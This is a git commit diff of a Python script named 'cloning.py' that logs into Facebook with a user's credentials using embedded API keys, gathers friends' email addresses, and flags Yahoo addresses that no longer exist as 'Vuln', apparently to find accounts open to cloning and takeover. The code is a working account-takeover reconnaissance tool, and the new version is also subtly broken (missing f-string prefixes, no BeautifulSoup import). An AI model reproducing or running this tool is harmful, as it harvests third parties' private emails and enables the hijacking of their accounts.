057cadb1d6c645d23d32cc9b2d01b03622d5aab7
l101l <53822422+l101l@users.noreply.github.com>
2019-08-06 21:32:09 +0800

    Update cloning.py

--- cloning.py
+++ cloning.py
@@ -1,76 +1,70 @@
-# encoding=utf8
-# Author: Zen-Oh-Sama
-import requests, json, os, re, sys, mechanize, urllib
-reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-os.system("clear")
-idt = raw_input("\033[39m[\033[31m*\033[39m] Email   : ")
-passw = raw_input("\033[39m[\033[31m*\033[39m] Password: ")
-url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
-data = urllib.urlopen(url)
-op = json.load(data)
-if 'access_token' in op:
-    token = (op["access_token"])
-    print ("\033[39m[\033[31m+\033[39m] Login Successful!")
-else:
-    print ("\033[39m[\033[31m+\033[39m] \033[31mLogin Failed!")
-    sys.exit()
-get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
-hasil = json.loads(get_friends.text)
-print ("\033[39m[\033[31m+\033[39m] Successful! Mendapatkan ID Teman...")
-#cok = open('Mail_Yahoo.txt','w')
-def defense():
-    global o, h
-    o = []
-    h = 0
-    print "\033[36m" + 55*"-"
-    print "\033[36m| " + 11*" " + "\033[35mEmail" + 14*" " + "\033[36m|" + 9*" " + "\033[33mVuln" + 8*" " + "\033[36m|"
-    print 55*"-"
-    for i in hasil['data']:
-        wrna = "\033[36m"
-        wrne = "\033[39m"
-        h +=1
-        o.append(h)
-        x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
-        z = json.loads(x.text)
+import requests, json, sys, hashlib, mechanize
+
+from os import system
+system("clear")
+class YC:
+    def __init__(self, email, pw):
+        self.email = email
+        self.pw = pw
         try:
-            kunci = re.compile(r'@.*')
-            cari = kunci.search(z['email']).group()
-            if 'yahoo.com' in cari:
-                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
-                br._factory.is_html = True
-                br.select_form(nr=0)
-                br["username"] = z['email']
-                j = br.submit().read()
-                Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
-                try:
-                    cd = Zen.search(j).group()
-                except:
-                    vuln = 6*" " + "\033[31mNot Vuln"
-                    #Email Len
-                    lean = 30 - (len(z['email']))
-                    eml = lean * " "
-                    #Name Len
-                    lone = 24 - (len(vuln))
-                    namel = lone * " "
-                    print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
-                    continue
-                if '"messages.ERROR_INVALID_USERNAME">' in cd:
-                    vuln = 8*" " + "\033[32mVuln"
-                else:
-                    vuln = 5*" " + "\033[31mNot Vuln"
-                #Email Len
-                lean = 30 - (len(z['email']))
-                eml = lean * " "
-                #Name Len
-                #Author: Zen-Oh-Sama
-                lone = 24 - (len(vuln))
-                namel = lone * " "
-                print "\033[36m| " + wrna + z['email'] + eml + "\033[36m| " + wrne + vuln + namel + " \033[36m|"
-            else:
-                pass
+            self.token = self.__getToken()['access_token']
+            print ("\033[31m[\033[32m!\033[31m] \033[39mLogin Berhasil")
+            print ("\033[36m" + 50*"-")
+            print ("\033[36m|" + 11*" " + "\033[35mEmail" + 11*" " + "\033[36m|" + 8*" " + "\033[33mVuln" + 8*" " + "\033[36m|")
+            print ("\033[36m" + 50*"-")
         except KeyError:
-            pass
-defense()
+            print ("\033[31m[\033[31m!\033[31m] \033[39mLogin Error")
+            sys.exit()
+        self.__looping(json.loads(requests.get("https://graph.facebook.com/me/friends?access_token={self.token}").text))
+    def __looping(self, dataFL):
+        br = mechanize.Browser()
+        br.set_handle_robots(False)
+        for i in dataFL["data"]:
+            try:
+                em = json.loads(requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+self.token).text)["email"]
+            except KeyError:
+                continue
+            if ("yahoo.com" in em): pass
+            else: continue
+            br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+            br._factory.is_html = True
+            br.select_form(nr=0)
+            br["username"] = (em)
+            soup = BeautifulSoup(br.submit().read(), features="html.parser")
+            status = soup.find_all("p")
+            vuln = ("\033[31mNot Vuln")
+            for p in status:
+                try:
+                    if (p.get("data-error") == "messages.ERROR_INVALID_USERNAME"):
+                        vuln = ("\033[32mVuln")
+                        break
+                except:
+                    pass
+            len_email = (27-len(em))
+            if (vuln == "\033[32mVuln"):
+                len_vuln = (19-(len(vuln)-8))
+                print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-10)*" "+vuln+(len_vuln-10)*" "+"\033[36m|")
+            else:
+                len_vuln = (19-(len(vuln)-8))
+                print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-7)*" "+vuln+(len_vuln-9)*" "+"\033[36m|")
+    def __getToken(self):
+        data = {
+            "api_key":"882a8490361da98702bf97a021ddc14d",
+            "credentials_type":"password",
+            "email":self.email,
+            "format":"JSON",
+            "generate_machine_id":"1",
+            "generate_session_cookies":"1",
+            "locale":"en_US",
+            "method":"auth.login",
+            "password":self.pw,
+            "return_ssl_resources":"0",
+            "v":"1.0"}
+        sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={self.email}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={self.pw}return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32').encode('utf-8')
+        x = hashlib.new('md5')
+        x.update(sig)
+        data.update({
+            "sig": x.hexdigest()
+        })
+        return json.loads(requests.post("https://api.facebook.com/restserver.php", data=data).text)
+YC(str(input("\033[31m[\033[39m+\033[31m] \033[39mEmail   : ")), str(input("\033[31m[\033[39m+\033[31m] \033[39mPassword: ")))
